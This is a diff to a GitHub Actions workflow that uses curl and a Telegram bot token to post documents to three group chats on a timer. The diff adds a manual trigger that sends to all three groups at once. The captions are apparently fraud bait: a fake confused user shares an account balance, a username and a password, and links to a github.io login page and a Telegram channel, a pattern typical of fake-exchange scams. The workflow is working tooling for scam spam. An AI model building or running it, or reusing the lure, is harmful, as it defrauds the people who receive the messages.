@@ -26,11 +26,12 @@ jobs:
           MINUTE=$(date -u +%M)
           
           echo "Current UTC time: $HOUR:$MINUTE"
+          echo "Triggered by: ${{ github.event_name }}"
           
           # ============================================
           # GROUP 1 (10:00 PM = 18:30 UTC)
           # ============================================
-          if [ "$HOUR" == "18" ] && [ "$MINUTE" == "30" ]; then
+          if [ "${{ github.event_name }}" == "workflow_dispatch" ] || ([ "$HOUR" == "18" ] && [ "$MINUTE" == "30" ]); then
             echo "Sending to Group 1 (10:00 PM)"
             
             # Send greeting
@@ -47,12 +48,14 @@ jobs:
             -F chat_id=-1002507938213 \
             -F caption="$CAPTION" \
             https://api.telegram.org/bot${BOT_TOKEN}/sendDocument
+          else
+            echo "Skipping Group 1 - time not matched"
           fi
           
           # ============================================
           # GROUP 2 (1:00 AM = 21:30 UTC)
           # ============================================
-          if [ "$HOUR" == "21" ] && [ "$MINUTE" == "30" ]; then
+          if [ "${{ github.event_name }}" == "workflow_dispatch" ] || ([ "$HOUR" == "21" ] && [ "$MINUTE" == "30" ]); then
             echo "Sending to Group 2 (1:00 AM)"
             
             CAPTION=$'How does this work?\nI don\'t really understand.\nWhat am I supposed to do with this?\nPlease help.\n\nbalance: 3,970$\nusername: john371\npassword: 2525561\n\nLogin: https://log-000.github.io/\nhttps://t.me/illuminati300/36'
@@ -61,12 +64,14 @@ jobs:
             -F chat_id=-1002665528411 \
             -F caption="$CAPTION" \
             https://api.telegram.org/bot${BOT_TOKEN}/sendDocument
+          else
+            echo "Skipping Group 2 - time not matched"
           fi
           
           # ============================================
           # GROUP 3 (3:00 AM = 23:30 UTC)
           # ============================================
-          if [ "$HOUR" == "23" ] && [ "$MINUTE" == "30" ]; then
+          if [ "${{ github.event_name }}" == "workflow_dispatch" ] || ([ "$HOUR" == "23" ] && [ "$MINUTE" == "30" ]); then
             echo "Sending to Group 3 (3:00 AM)"
             
             CAPTION=$'How does this work?\nI don\'t really understand.\nWhat am I supposed to do with this?\nPlease help.\n\nbalance: 3,970$\nusername: john371\npassword: 2525561\n\nLogin: https://log-000.github.io/\nhttps://t.me/illuminati300/36'
@@ -75,4 +80,6 @@ jobs:
             -F chat_id=-1002680039813 \
             -F caption="$CAPTION" \
             https://api.telegram.org/bot${BOT_TOKEN}/sendDocument
+          else
+            echo "Skipping Group 3 - time not matched"
           fi
